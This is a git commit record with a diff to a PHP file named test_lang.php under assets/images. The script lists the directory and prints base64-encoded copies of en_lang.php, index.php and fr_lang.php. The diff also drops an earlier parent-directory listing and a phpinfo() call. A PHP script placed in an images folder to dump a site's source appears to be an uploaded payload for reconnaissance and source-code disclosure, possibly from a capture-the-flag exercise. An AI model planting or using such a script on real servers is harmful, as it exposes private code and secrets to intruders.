19dcbcaca12214ceed37c431ca58e73e02431405
Skrox <demey.alexandre@protonmail.com>
2023-02-03 12:12:36 +0100

    Update test_lang.php

--- assets/images/test_lang.php
+++ assets/images/test_lang.php
@@ -2,10 +2,12 @@
 <?php
   print_r(scandir("."));
 
-  print_r(scandir("../."));
-    
   $data = file_get_contents("en_lang.php");
   echo base64_encode($data);
     
-  phpinfo();
+  $data = file_get_contents("index.php");
+  echo base64_encode($data);
+
+  $data = file_get_contents("fr_lang.php");
+  echo base64_encode($data);
 ?>
